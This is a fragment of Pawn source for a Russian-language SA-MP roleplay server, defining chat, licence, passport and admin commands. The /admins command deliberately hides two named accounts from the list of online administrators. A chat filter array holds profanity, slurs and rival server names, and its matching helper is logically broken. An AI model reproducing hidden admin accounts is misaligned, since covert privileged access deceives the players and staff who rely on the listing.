	ShowPlayerDialog(playerid,0,DIALOG_STYLE_MSGBOX,"Лидеры организаций онлайн",str44,"Назад","");
	return true;
}

CMD:admins(playerid, params[])
{
    if(PlayerLogged[playerid] == false) return 1;
    if(PlayerInfo[playerid][pAdmin] > 0 && AdminLogged[playerid] == true || PlayerInfo[playerid][pADM] > 0 || PlayerInfo[playerid][pVip] > gettime())
    {
		SendClientMessage(playerid, -1, "|__________[Администраторы онлайн]__________|");
		new kek = 0;
		static const fmt_string[] = "[%i] - %s[id: %i]: Уровень: %i. [%d/3] %s %s";
		new str[sizeof(fmt_string)+2+MAX_PLAYER_NAME+4+20+20];
		for(new i = 0; i < MAX_PLAYERS; i++)
		{
		    if(!IsPlayerConnected(i) || PlayerLogged[i] == false) continue;
	        if(PlayerInfo[i][pAdmin] > 0)
	        {
	            if(strcmp(PlayerInfo[i][pSendername], "Enique_Guddi", true) == 0 || strcmp(PlayerInfo[i][pSendername], "Samuel_Migos", true) == 0) continue;
				new str1[50],str2[20];
				if(GetPVarInt(i,"Spec") > 0) format(str2,sizeof(str2),"| Spec (id: %d)",GetPVarInt(i,"SpecID"));
				else str2 = "";
				if(GetPVarInt(i, "AFK_Time") > 1) format(str1,sizeof(str1),"| АФК: %i сек",GetPVarInt(i,"AFK_Time"));
				else str1 = "";
	    		
				format(str, sizeof(str), fmt_string,kek,PlayerInfo[i][pSendername],i,PlayerInfo[i][pAdmin],PlayerInfo[i][pAvig],str1,str2);
				SendClientMessage(playerid,CYELLOW,str);
				kek++;
			}
		}
	}
	return true;
}
CMD:showlicenses(playerid, params[]) return cmd_lic(playerid,params);


CMD:agl(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 3 || AdminLogged[playerid] == false) return true;
	if(sscanf(params, "i", params[0])) return SendClientMessage(playerid, CGREY, "Используйте: /agl [id]");
	if(!IsPlayerConnected(params[0]) || PlayerLogged[params[0]] == false) return SendClientMessage(playerid,CGREY,"Такого игрока нет на сервере");
	ShowPlayerDialog(playerid,457,DIALOG_STYLE_LIST,"Выберите лицензию","Лицензия на автомобиль\n\
	Лицензия на мототранспорт\n\
	Лицензия на водный транспорт\n\
	Лицензия на воздушный транспорт\n\
	Лицензия на автобус\n\
	Лицензия на грузовой транспорт\n\
	Лицензия на ношение оружия","Далее","Отмена");
	SetPVarInt(playerid,"AGLP",params[0]);
/*	new text[25];
	new full = 0;
	if(strcmp(params[1], "C", true) == 0)
	{
	    if(PlayerInfo[params[0]][pLic][0] == 1) return SendClientMessage(playerid, CGREY, "У игрока уже есть эта лицензия");
        PlayerInfo[params[0]][pLic][0] = 1;
        PlayerInfo[params[0]][pLicTime][0] = gettime()+60*60*24*90;
        format(text,sizeof(text),"автомобиль");
        full = 1;
	}
	else if(strcmp(params[1], "M", true) == 0)
	{
	    if(PlayerInfo[params[0]][pLic][1] == 1) return SendClientMessage(playerid, CGREY, "У игрока уже есть эта лицензия");
        PlayerInfo[params[0]][pLic][1] = 1;
        PlayerInfo[params[0]][pLicTime][1] = gettime()+60*60*24*90;
        format(text,sizeof(text),"мототранспорт");
        full = 1;
	}
	else if(strcmp(params[1], "B", true) == 0)
	{
	    if(PlayerInfo[params[0]][pLic][2] == 1) return SendClientMessage(playerid, CGREY, "У игрока уже есть эта лицензия");
        PlayerInfo[params[0]][pLic][2] = 1;
        PlayerInfo[params[0]][pLicTime][2] = gettime()+60*60*24*90;
        format(text,sizeof(text),"водный транспорт");
        full = 1;
	}
	else if(strcmp(params[1], "P", true) == 0)
	{
	    if(PlayerInfo[params[0]][pLic][3] == 1) return SendClientMessage(playerid, CGREY, "У игрока уже есть эта лицензия");
        PlayerInfo[params[0]][pLic][3] = 1;
        PlayerInfo[params[0]][pLicTime][3] = gettime()+60*60*24*90;
        format(text,sizeof(text),"воздушный транспорт");
        full = 1;
	}
	else if(strcmp(params[1], "W", true) == 0)
	{
	    if(PlayerInfo[params[0]][pLic][4] == 1) return SendClientMessage(playerid, CGREY, "У игрока уже есть эта лицензия");
        PlayerInfo[params[0]][pLic][4] = 1;
        PlayerInfo[params[0]][pLicTime][4] = gettime()+60*60*24*90;
 		format(text,sizeof(text),"оружие");
 		full = 1;
	}
	if(full == 0) return SendClientMessage(playerid, CGREY, "Лицензии: C | M | B | P | W");
	GiveInv(playerid,449,1);
	static const fmt_string5[] = "Администратор {f7ae11}%s{FFFFFF} выдал вам лицензию на {f7ae11}%s{FFFFFF}";
	new str5[sizeof(fmt_string5)+MAX_PLAYER_NAME+25];
	format(str5, sizeof(str5), fmt_string5,PlayerInfo[playerid][pSendername],text);
	SendClientMessage(params[0],-1,str5);
	static const fmt_string[] = "[A] %s выдал игроку %s лицензию на %s";
	new str[sizeof(fmt_string)+MAX_PLAYER_NAME+MAX_PLAYER_NAME+30];
	format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],PlayerInfo[params[0]][pSendername],text);
	SendAdminMessage(CGREY,str);*/
	return true;
}
new Domains[][] =
{
	"Гоменюк","ЛОХ","хуй","гамно","Алик","слив","привет от","Юнион","ЮНИОН","ХУЙ","Сливчик","СЛИВЧИК","Самп","САМП","скачал","СКАЧАЛ","факт","Пиздуйте","ПИЗДУЙТЕ","ГОВНА","говна","я Правда","Я ПРАВДА","я ПРАВДА","АРИЗОНЕ","Аризоне","Пиздорасы","ПИДОРАСЫ","ЕБУ","ебу","ебал","ЕБАЛ",
	"пизда","виртов","Слив","шалава","месная","уходите","АРИЗОНА","Факты","ФАКТЫ","ФАКТ","Факт","СВИТ","Свит","A","a","B","b","C","c","D","d","E","e","F","f","G","g",
	"H","h","I","i","J","j","K","k","L","l","M","m","N","n","O","o","P","p","Q","q","R","r","S","s","T","t","U","u","V","v","W","w","X","x","Y","y","Z","z","гугл","яндекс","Стейдж","Даймонд","Диамонд","Ухадите","Уходите","сервер","Сервер","стейдж","диамонд","даймонд","Мастер","мастер","МАСТЕР","админ","АДМИН","Админ","Лидерк","лидерк","ЛИДЕРК"
};
IsADomen(text[])
{

	for(new i; i < sizeof(Domains); i ++)
	{
		new find = strfind(text, Domains[i], true);
		if(find != -1) if(IsASymbol(text, find - 2, find))return true;
	}
	return false;
}
IsASymbol(text[], first, end)
{
	if(first < 0) first = 0;
	if(end >= strlen(text)) end = strlen(text) - 1;
	for(new i = first; i <= end; i ++) return true;
	return false;
}
ReplaceText(text[])
{
	for(new i; i < strlen(text); i ++)
	{
		if('0' <= text[i] <= '9') text[i] = '*';
	}
	return true;
}
IsAIP(text[])
{
	new numbers;
	for(new i = 0;i < strlen(text); i++) if('0' <= text[i] <= '9') if(!('0' <= text[i+1] <= '9')) numbers ++;
	if(numbers >= 4) return true;
	return false;
}

CMD:join(playerid)
{
    new days,mon,yer;
	getdate(yer,mon,days);
	new str[152],strg[2048],kek;
	strcat(strg,"Организация\tБлижайший набор\tПримечания");
    for(new i = 1; i <= TOTALFRAC; i++)
    {
        if(!FracInfo[i][fNabor]) continue;
        if(FracInfo[i][fNabor] > gettime()) format(str,sizeof(str),"\n%s\t%sЧерез %s{ffffff}\t%s",FracInfo[i][fName],(FracInfo[i][fNabor]-gettime() < 86400) ? ("{20BA09}"): ("{FFFF00}"),timec(FracInfo[i][fNabor]),FracInfo[i][fNaborText]);
        else format(str,sizeof(str),"\n%s\t{F85A5A}Был %s назад{ffffff}\t%s",FracInfo[i][fName],timec(FracInfo[i][fNabor]),FracInfo[i][fNaborText]);
		strcat(strg,str);
		ListNick[playerid][kek] = i;
		kek++;
    }
    return ShowPlayerDialog(playerid,375,DIALOG_STYLE_TABLIST_HEADERS,"Ближайшие наборы в организации",strg,"Далее","Отмена");
}

CMD:exchange(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return 1;
	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, CGREY, "Используйте: /exchange [id]");
	if(!IsPlayerConnected(params[0]) || PlayerLogged[params[0]] == false) return SendClientMessage(playerid,CGREY,"Такого игрока нет на сервере");
 	new Float:x,Float:y,Float:z;
    GetPlayerPos(params[0],x,y,z);
    if(!IsPlayerInRangeOfPoint(playerid, 5.0, x,y,z)) return SendClientMessage(playerid,CGREY,"Вы не рядом с игроком");
    if(GetPred(params[0]) == 1) return SendClientMessage(playerid,CGREY,"Игроку уже кто-то что-то предложил");
	SendClientMessage(playerid,CREWARD,"Вы предложили игроку открыть меню обмена");
	static const fmt_string1[] = "%s предложил Вам открыть меню обмена";
	new str1[sizeof(fmt_string1)+24];
	format(str1, sizeof(str1), fmt_string1,PlayerInfo[playerid][pSendername]);
	SendClientMessage(params[0],0xFF7F50FF,str1);
	SendClientMessage(params[0],CWHITE,"Для согласия нажмите{FF7F50} [Y]{FFFFFF} ,для отказа нажмите {FF7F50}[N]");
	SetPVarInt(params[0],"ObmEx",1);
	SetPVarInt(params[0],"ObmExP",playerid);
	return 1;
}

CMD:lic(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return 1;
	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, CGREY, "Используйте: /lic [id]");
	if(!IsPlayerConnected(params[0]) || PlayerLogged[params[0]] == false) return SendClientMessage(playerid,CGREY,"Такого игрока нет на сервере");
 	new Float:x,Float:y,Float:z;
    GetPlayerPos(params[0],x,y,z);
    if(!IsPlayerInRangeOfPoint(playerid, 5.0, x,y,z)) return SendClientMessage(playerid,CGREY,"Вы не рядом с игроком");
   	static const fmt_string1[] = "{FFFFFF}Лицензия на автомобиль: {f7ae11}%s %s{FFFFFF}\n",
        fmt_string7[] = "Лицензия на автобус: {f7ae11}%s %s{FFFFFF}\n",
        fmt_string8[] = "Лицензия на грузовой транспорт: {f7ae11}%s %s{FFFFFF}\n",
		fmt_string[] = "Лицензия на мототранспорт: {f7ae11}%s %s{FFFFFF}\n",
		fmt_string2[] = "Лицензия на водный транспорт: {f7ae11}%s %s{FFFFFF}\n",
		fmt_string3[] = "Лицензия на воздушный транспорт: {f7ae11}%s %s{FFFFFF}\n",
		fmt_string4[] = "Лицензия на ношение оружия: {f7ae11}%s %s{FFFFFF}",
		fmt_string5[] = "%s достает лицензии и показывает их %s",
		fmt_string6[] = "Лицензии: %s";
	new str1[sizeof(fmt_string1)+20],
		str[sizeof(fmt_string)+20],
		str2[sizeof(fmt_string2)+20],
		str3[sizeof(fmt_string3)+20],
		str4[sizeof(fmt_string4)+20],
		str7[sizeof(fmt_string7)+20],
		str8[sizeof(fmt_string8)+20],
		str5[sizeof(fmt_string5)+MAX_PLAYER_NAME+MAX_PLAYER_NAME],
		str6[sizeof(fmt_string6)+MAX_PLAYER_NAME];
    query = "";
    static StatusName[][] = {"Нет","Есть","Поддельная"};
    new licstr[30];
    format(licstr,sizeof(licstr),"(Срок: %s)",timec(PlayerInfo[playerid][pLicTime][L_AVTO]));
    new licstr1[30];
    format(licstr1,sizeof(licstr1),"(Срок: %s)",timec(PlayerInfo[playerid][pLicTime][L_BUS]));
    new licstr2[30];
    format(licstr2,sizeof(licstr2),"(Срок: %s)",timec(PlayerInfo[playerid][pLicTime][L_GRUZ]));
    new licstr3[30];
    format(licstr3,sizeof(licstr3),"(Срок: %s)",timec(PlayerInfo[playerid][pLicTime][L_MOTO]));
    new licstr4[30];
    format(licstr4,sizeof(licstr4),"(Срок: %s)",timec(PlayerInfo[playerid][pLicTime][L_VOD]));
    new licstr5[30];
    format(licstr5,sizeof(licstr5),"(Срок: %s)",timec(PlayerInfo[playerid][pLicTime][L_VOZ]));
    new licstr6[30];
    format(licstr6,sizeof(licstr6),"(Срок: %s)",timec(PlayerInfo[playerid][pLicTime][L_GUN]));
    
	format(str6, sizeof(str6), fmt_string6,PlayerInfo[playerid][pSendername]);
	//===================
	format(str1, sizeof(str1), fmt_string1,StatusName[PlayerInfo[playerid][pLic][L_AVTO]],(!PlayerInfo[playerid][pLic][L_AVTO]) ? ("") : (licstr));
	strcat(query,str1);
	format(str7, sizeof(str7), fmt_string7,StatusName[PlayerInfo[playerid][pLic][L_BUS]],(!PlayerInfo[playerid][pLic][L_BUS]) ? ("") : (licstr1));
	strcat(query,str7);
	format(str8, sizeof(str8), fmt_string8,StatusName[PlayerInfo[playerid][pLic][L_GRUZ]],(!PlayerInfo[playerid][pLic][L_GRUZ]) ? ("") : (licstr2));
	strcat(query,str8);
	format(str, sizeof(str), fmt_string,StatusName[PlayerInfo[playerid][pLic][L_MOTO]],(!PlayerInfo[playerid][pLic][L_MOTO]) ? ("") : (licstr3));
	strcat(query,str);
	format(str2, sizeof(str2), fmt_string2,StatusName[PlayerInfo[playerid][pLic][L_VOD]],(!PlayerInfo[playerid][pLic][L_VOD]) ? ("") : (licstr4));
	strcat(query,str2);
	format(str3, sizeof(str3), fmt_string3,StatusName[PlayerInfo[playerid][pLic][L_VOZ]],(!PlayerInfo[playerid][pLic][L_VOZ]) ? ("") : (licstr5));
	strcat(query,str3);
	format(str4, sizeof(str4), fmt_string4,StatusName[PlayerInfo[playerid][pLic][L_GUN]],(!PlayerInfo[playerid][pLic][L_GUN]) ? ("") : (licstr6));
	strcat(query,str4);
	
	ShowPlayerDialog(params[0],0,DIALOG_STYLE_MSGBOX,str6,query,"Назад","");
	format(str5, sizeof(str5), fmt_string5,PlayerInfo[playerid][pSendername],PlayerInfo[params[0]][pSendername]);
	ProxDetectorNew(playerid,30.0,COLOR_PURPLE,str5);
	SetPlayerChatBubble(playerid, str5, COLOR_PURPLE, 30.0, 7000);
    return true;
}
CMD:pass(playerid, params[]) return cmd_showpass(playerid,params);
CMD:carpass(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return 1;
	if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,CGREY,"Вы не в транспорте");
	new full = 0,text1[20];
	static const fmt_st2ring[] = "Тех.паспорт: %s";
	new s3tr[sizeof(fmt_st2ring)+MAX_PLAYER_NAME];
	static const fmt_string1[] = "{FFFFFF}Модель: {f7ae11}%s{FFFFFF}\nНомера: {f7ae11}%s{FFFFFF}\nВладелец: {f7ae11}%s{FFFFFF}\nГос.Цена: {f7ae11}$%i{FFFFFF}\nОплачен на: {f7ae11}%s";
	new strr[sizeof(fmt_string1)+MAX_PLAYER_NAME+20+20+20+20];
	for(new v = 1; v <= TOTALV; v++)
	{
	    if(VInfo[v][vcar] == INVALID_VEHICLE_ID) continue;
		if(GetPlayerVehicleID(playerid) == VInfo[v][vcar])
		{
		    
			format(s3tr, sizeof(s3tr), fmt_st2ring,VehicleNameS[VInfo[v][vmodel]-400]);
			switch(VInfo[v][voplata])
	        {
	            case 0: text1 = "Не оплачен";
	            default: format(text1,sizeof(text1),"%s",timec(VInfo[v][voplata]));
	        }
			
			format(strr, sizeof(strr), fmt_string1,VehicleNameS[VInfo[v][vmodel]-400],VInfo[v][vnumber],VInfo[v][vname],VInfo[v][vcost],text1);
			ShowPlayerDialog(playerid,0,DIALOG_STYLE_MSGBOX,s3tr,strr,"Назад","");
			full++;
		}
	}
	if(full == 0) return SendClientMessage(playerid,CGREY,"Данный транспорт никому не принадлежит");
	return true;
}
CMD:plane(playerid)
{
    if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 6 || AdminLogged[playerid] == false) return true;
    StartPlane(PlayerInfo[playerid][pMember]);
    static const fmt_str[] = "[A] %s запустил самолет с наркотиками";
	new str[sizeof(fmt_str)+32];
	format(str, sizeof(str), fmt_str,PlayerInfo[playerid][pSendername]);
    SendAdminMessage(CGREY,str);
    return 1;
}
CMD:poezd(playerid, params[])
{
    if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 6 || AdminLogged[playerid] == false) return true;
	SetPlayerVirtualWorld(npcid,0);
	SetVehicleVirtualWorld(vehnpc,0);
	PutPlayerInVehicle(npcid, vehnpc, 0);
	for(new i = 0; i <= 1; i++)
	{
		if(IsValidDynamic3DTextLabel(sam[i])) DestroyDynamic3DTextLabel(sam[i]);
		if(IsValidDynamicObject(objectsam[i])) DestroyDynamicObject(objectsam[i]);
		samolet[i]= 0;
	}
	mat = 1;
	static const fmt_str[] = "[A] %s запустил поезд с материалами";
	new str[sizeof(fmt_str)+32];
	format(str, sizeof(str), fmt_str,PlayerInfo[playerid][pSendername]);
    SendAdminMessage(CGREY,str);
//	samolet = 40000;
	return true;
}
CMD:container(playerid)
{
    if(PlayerInfo[playerid][pAdmin] < 6 || AdminLogged[playerid] == false) return true;
    SendClientMessageToAll(CREWARD,"[Новости] {FFFFFF} Аукцион контейнеров начался! Сделать ставку можно в Порту Los Santos.");
    for(new i = 0; i < 6; i++)
    {
        if(Containers[i]) continue;
        Containers[i] = true;
        MaxBet[i] = 0;
        
        if(i < 4) UpdateDynamic3DTextLabelText(ContText[i],-1,"{f7ae11}[Контейнеры]{ffffff}\nАукцион: {f7ae11}Запущен{ffffff}\nМаксиальная ставка: {f7ae11}0$");
        else UpdateDynamic3DTextLabelText(ContText[i],-1,"{f7ae11}[Контейнеры]{ffffff}\nАукцион: {f7ae11}Запущен{ffffff}\nМаксиальная ставка: {f7ae11}0 Donate Points");
    }
    static const fmt_str[] = "[A] %s запустил аукцион контейнеров";
	new str[sizeof(fmt_str)+32];
	format(str, sizeof(str), fmt_str,PlayerInfo[playerid][pSendername]);
    SendAdminMessage(CGREY,str);
    return 1;
}
CMD:showpass(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return 1;
	if(PlayerInfo[playerid][pPass] == 0) return SendClientMessage(playerid,CGREY,"У Вас нет паспорта");
	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, CGREY, "Используйте: /pass [id]");
	if(!IsPlayerConnected(params[0]) || PlayerLogged[params[0]] == false) return SendClientMessage(playerid,CGREY,"Такого игрока нет на сервере");
 	new Float:x,Float:y,Float:z;
    GetPlayerPos(params[0],x,y,z);
    if(!IsPlayerInRangeOfPoint(playerid, 5.0, x,y,z)) return SendClientMessage(playerid,CGREY,"Вы не рядом с игроком");
    new text[20],text2[50];
	switch(PlayerInfo[playerid][pSex])
	{
	 case 1: text = "Мужской";
	 case 2: text = "Женский";
	}
	if(GetPlayerHouse(playerid) || GetPlayerZasel(playerid)) format(text2,sizeof(text2),"Дом №%i",GetPVarInt(playerid,"PlayerHouse"));
	else if (GetPlayerKom(playerid)) format(text2,sizeof(text2),"Команта №%i (%s)",KomInfo[GetPVarInt(playerid,"PlayerKom")][kNum],BizInfo[KomInfo[GetPVarInt(playerid,"PlayerKom")][kbiz]][bName]);
	else format(text2,sizeof(text2),"-");
	static const fmt_st2ring[] = "Паспорт: %s";
	new s3tr[sizeof(fmt_st2ring)+MAX_PLAYER_NAME];
	format(s3tr, sizeof(s3tr), fmt_st2ring,PlayerInfo[playerid][pSendername]);
	static const fmt_string1[] = "{FFFFFF}Имя Фамилия: {f7ae11}%s{FFFFFF}\nВозраст: {f7ae11}%i{FFFFFF}\nПол: {f7ae11}%s{FFFFFF}\nКол-во арестов: {f7ae11}%i{FFFFFF}\nЗаконопослушность: {f7ae11}%i{FFFFFF}\n\nМесто проживания: {f7ae11}%s{FFFFFF}\nНомер паспорта: {f7ae11}%s";
	new strr[sizeof(fmt_string1)+MAX_PLAYER_NAME+20+20+20+30];
	format(strr, sizeof(strr), fmt_string1,PlayerInfo[playerid][pSendername],PlayerInfo[playerid][pVoz],text,PlayerInfo[playerid][pAr],PlayerInfo[playerid][pZakon],text2,PlayerInfo[playerid][pNumPass]);
	ShowPlayerDialog(params[0],0,DIALOG_STYLE_MSGBOX,s3tr,strr,"Назад","");
	static const fmt_string5[] = "%s достает документы и показывает их %s";
	new str5[sizeof(fmt_string5)+MAX_PLAYER_NAME+MAX_PLAYER_NAME];
	format(str5, sizeof(str5), fmt_string5,PlayerInfo[playerid][pSendername],PlayerInfo[params[0]][pSendername]);
	ProxDetectorNew(playerid,30.0,COLOR_PURPLE,str5);
	SetPlayerChatBubble(playerid, str5, COLOR_PURPLE, 30.0, 7000);
	static const fmt_string[] = "достал и показал документы игроку %s";
	new str[sizeof(fmt_string)+MAX_PLAYER_NAME];
	format(str, sizeof(str), fmt_string,PlayerInfo[params[0]][pSendername]);
	SetPlayerChatBubble(playerid, str, COLOR_PURPLE, 30.0, 7000);
    return true;
}
CMD:d(playerid, params[])
{
    if(PlayerLogged[playerid] == false) return 1;
    if(PlayerInfo[playerid][pMember] == 0 ) return SendClientMessage(playerid,CGREY,"Вы не состоите в организации");
    if(PlayerInfo[playerid][pWork] == 0) return SendClientMessage(playerid,CGREY,"Начните рабочий день на базе организации");
    if(PlayerInfo[playerid][pRank] < 5) return SendClientMessage(playerid,CGREY,"С чат депортамента можно писать с 5 ранга");
    if(PlayerInfo[playerid][pMuted] > 0)
	{
	    SetPlayerChatBubble(playerid,"Что-то промычал",0x20BA09FF,20.0,1000);
  	 	static const fmt_str[] = "Молчанка заканчивается через %i секунд";
		new string[sizeof(fmt_str)+10];
		format(string, sizeof(string), fmt_str, PlayerInfo[playerid][pMuted]);
		SendClientMessage(playerid,CGREY,string);
		return true;
	}
	if(!IsAMafia(playerid) && !IsAGang(playerid) && PlayerInfo[playerid][pMember]!=F_NEWS)
	{
		new text[80];
    	if(sscanf(params, "s[80]", text)) return SendClientMessage(playerid, CGREY, "Используйте: /d [текст]");
    	static const fmt_string[] = "[D] (%s) %s %s[%d]: %s ";
		new str[sizeof(fmt_string)+32+32+MAX_PLAYER_NAME+4+80];
    	if(strlen(text) >= 40)
		{
			new string1[128];
			strmid(string1,text,41,128,128);
			strdel(text,41,128);
			format(str, sizeof(str), fmt_string,FracInfo[PlayerInfo[playerid][pMember]][fName],FracRank[PlayerInfo[playerid][pMember]][PlayerInfo[playerid][pRank]],PlayerInfo[playerid][pSendername],playerid,text);
	 		SendDMes(str);
			format(str, sizeof(str), fmt_string,FracInfo[PlayerInfo[playerid][pMember]][fName],FracRank[PlayerInfo[playerid][pMember]][PlayerInfo[playerid][pRank]],PlayerInfo[playerid][pSendername],playerid,string1);
	 		SendDMes(str);
		}
		else
		{
			format(str, sizeof(str), fmt_string,FracInfo[PlayerInfo[playerid][pMember]][fName],FracRank[PlayerInfo[playerid][pMember]][PlayerInfo[playerid][pRank]],PlayerInfo[playerid][pSendername],playerid,text);
	 		SendDMes(str);
 		}
    }
	return true;
}
CMD:db(playerid, params[])
{
    if(PlayerLogged[playerid] == false) return 1;
    if(PlayerInfo[playerid][pMember] == 0 ) return SendClientMessage(playerid,CGREY,"Вы не состоите в организации");
    if(PlayerInfo[playerid][pWork] == 0) return SendClientMessage(playerid,CGREY,"Начните рабочий день на базе организации");
    if(PlayerInfo[playerid][pRank] < 5) return SendClientMessage(playerid,CGREY,"С чат депортамента можно писать с 5 ранга");
    if(PlayerInfo[playerid][pMuted] > 0)
	{
	    SetPlayerChatBubble(playerid,"Что-то промычал",0x20BA09FF,20.0,1000);
  	 	static const fmt_str[] = "Молчанка заканчивается через %i секунд";
		new string[sizeof(fmt_str)+10];
		format(string, sizeof(string), fmt_str, PlayerInfo[playerid][pMuted]);
		SendClientMessage(playerid,CGREY,string);
		return true;
	}
	if(!IsAMafia(playerid) && !IsAGang(playerid) && PlayerInfo[playerid][pMember]!=F_NEWS)
	{
	    new text[80];
    	if(sscanf(params, "s[80]", text)) return SendClientMessage(playerid, CGREY, "Используйте: /db [текст]");
    	static const fmt_string[] = "[Db] (( (%s) %s %s[%d]: %s ))";
		new str[sizeof(fmt_string)+32+32+MAX_PLAYER_NAME+4+80];
    	if(strlen(text) >= 40)
		{
			new string1[128];
			strmid(string1,text,41,128,128);
			strdel(text,41,128);
			format(str, sizeof(str), fmt_string,FracInfo[PlayerInfo[playerid][pMember]][fName],FracRank[PlayerInfo[playerid][pMember]][PlayerInfo[playerid][pRank]],PlayerInfo[playerid][pSendername],playerid,text);
	 		SendDMes(str);
			format(str, sizeof(str), fmt_string,FracInfo[PlayerInfo[playerid][pMember]][fName],FracRank[PlayerInfo[playerid][pMember]][PlayerInfo[playerid][pRank]],PlayerInfo[playerid][pSendername],playerid,string1);
	 		SendDMes(str);
		}
		else
		{
			format(str, sizeof(str), fmt_string,FracInfo[PlayerInfo[playerid][pMember]][fName],FracRank[PlayerInfo[playerid][pMember]][PlayerInfo[playerid][pRank]],PlayerInfo[playerid][pSendername],playerid,text);
	 		SendDMes(str);
 		}
    }
	return true;
}
CMD:r(playerid, params[])
{
    if(PlayerLogged[playerid] == false) return 1;
    if(PlayerInfo[playerid][pMember] == 0 ) return SendClientMessage(playerid,CGREY,"Вы не состоите в организации");
    if(PlayerInfo[playerid][pWork] == 0) return SendClientMessage(playerid,CGREY,"Начните рабочий день на базе организации");
    if(PlayerInfo[playerid][pMuted] > 0)
	{
	    SetPlayerChatBubble(playerid,"Что-то промычал",0x20BA09FF,20.0,1000);
  	 	static const fmt_str[] = "Молчанка заканчивается через %i секунд";
		new string[sizeof(fmt_str)+10];
		format(string, sizeof(string), fmt_str, PlayerInfo[playerid][pMuted]);
		SendClientMessage(playerid,CGREY,string);
		return true;
	}
	if(!IsAMafia(playerid) && !IsAGang(playerid))
	{
		new text[80];
    	if(sscanf(params, "s[80]", text)) return SendClientMessage(playerid, CGREY, "Используйте: /r [текст]");
   		static const fmt_string[] = "[R] %s %s[%d]: %s";
		new str[sizeof(fmt_string)+32+MAX_PLAYER_NAME+4+80];
		if(strlen(text) >= 40)
		{
			new string1[128];
			strmid(string1,text,41,128,128);
			strdel(text,41,128);
			format(str, sizeof(str), fmt_string,FracRank[PlayerInfo[playerid][pMember]][PlayerInfo[playerid][pRank]],PlayerInfo[playerid][pSendername],playerid,text);
			SendFMes(PlayerInfo[playerid][pMember],COLOR_BLUE,str);
			format(str, sizeof(str), fmt_string,FracRank[PlayerInfo[playerid][pMember]][PlayerInfo[playerid][pRank]],PlayerInfo[playerid][pSendername],playerid,string1);
			SendFMes(PlayerInfo[playerid][pMember],COLOR_BLUE,str);
		}
		else
		{
			format(str, sizeof(str), fmt_string,FracRank[PlayerInfo[playerid][pMember]][PlayerInfo[playerid][pRank]],PlayerInfo[playerid][pSendername],playerid,text);
			SendFMes(PlayerInfo[playerid][pMember],COLOR_BLUE,str);
 		}
		
    }
	return true;
}
CMD:rb(playerid, params[])
{
    if(PlayerLogged[playerid] == false) return 1;
    if(PlayerInfo[playerid][pMember] == 0 ) return SendClientMessage(playerid,CGREY,"Вы не состоите в организации");
    if(PlayerInfo[playerid][pWork] == 0) return SendClientMessage(playerid,CGREY,"Начните рабочий день на базе организации");
    if(PlayerInfo[playerid][pMuted] > 0)
	{
	    SetPlayerChatBubble(playerid,"Что-то промычал",0x20BA09FF,20.0,1000);
  	 	static const fmt_str[] = "Молчанка заканчивается через %i секунд";
		new string[sizeof(fmt_str)+10];
		format(string, sizeof(string), fmt_str, PlayerInfo[playerid][pMuted]);
		SendClientMessage(playerid,CGREY,string);
		return true;
	}
	if(!IsAMafia(playerid) && !IsAGang(playerid))
	{
		new text[80];
    	if(sscanf(params, "s[80]", text)) return SendClientMessage(playerid, CGREY, "Используйте: /rb [текст]");
   		static const fmt_string[] = "[Rb] (( %s %s[%d]: %s ))";
		new str[sizeof(fmt_string)+32+MAX_PLAYER_NAME+4+80];
		if(strlen(text) >= 40)
		{
			new string1[128];
			strmid(string1,text,41,128,128);
			strdel(text,41,128);
			format(str, sizeof(str), fmt_string,FracRank[PlayerInfo[playerid][pMember]][PlayerInfo[playerid][pRank]],PlayerInfo[playerid][pSendername],playerid,text);
			SendFMes(PlayerInfo[playerid][pMember],COLOR_BLUE,str);
			format(str, sizeof(str), fmt_string,FracRank[PlayerInfo[playerid][pMember]][PlayerInfo[playerid][pRank]],PlayerInfo[playerid][pSendername],playerid,string1);
			SendFMes(PlayerInfo[playerid][pMember],COLOR_BLUE,str);
		}
		else
		{
			format(str, sizeof(str), fmt_string,FracRank[PlayerInfo[playerid][pMember]][PlayerInfo[playerid][pRank]],PlayerInfo[playerid][pSendername],playerid,text);
			SendFMes(PlayerInfo[playerid][pMember],COLOR_BLUE,str);
 		}
    }
	return true;
}
CMD:fr(playerid, params[])
{
    if(PlayerLogged[playerid] == false) return 1;
    if(!GetPVarInt(playerid,"FR")) return 1;
    if(PlayerInfo[playerid][pMuted] > 0)
	{
	    SetPlayerChatBubble(playerid,"Что-то промычал",0x20BA09FF,20.0,1000);
  	 	static const fmt_str[] = "Молчанка заканчивается через %i секунд";
		new string[sizeof(fmt_str)+10];
		format(string, sizeof(string), fmt_str, PlayerInfo[playerid][pMuted]);
		SendClientMessage(playerid,CGREY,string);
		return true;
	}
	new text[80];
	if(sscanf(params, "s[80]", text)) return SendClientMessage(playerid, CGREY, "Используйте: /fr [текст]");
	static const fmt_string[] = "[FR] %s[%d]: %s";
	new str[sizeof(fmt_string)+MAX_PLAYER_NAME+4+80];
	if(strlen(text) >= 40)
	{
		new string1[128];
		strmid(string1,text,41,128,128);
		strdel(text,41,128);
		format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],playerid,text);
		SendRMes(COLOR_BLUE,str);
		format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],playerid,string1);
		SendRMes(COLOR_BLUE,str);
	}
	else
	{
		format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],playerid,text);
		SendRMes(COLOR_BLUE,str);
	}
	return true;
}



CMD:f(playerid, params[])
{
    if(PlayerLogged[playerid] == false) return 1;
    if(PlayerInfo[playerid][pMember] == 0 ) return SendClientMessage(playerid,CGREY,"Вы не состоите в организации");
    if(PlayerInfo[playerid][pMuted] > 0)
	{
	    SetPlayerChatBubble(playerid,"Что-то промычал",0x20BA09FF,20.0,1000);
  	 	static const fmt_str[] = "Молчанка заканчивается через %i секунд";
		new string[sizeof(fmt_str)+10];
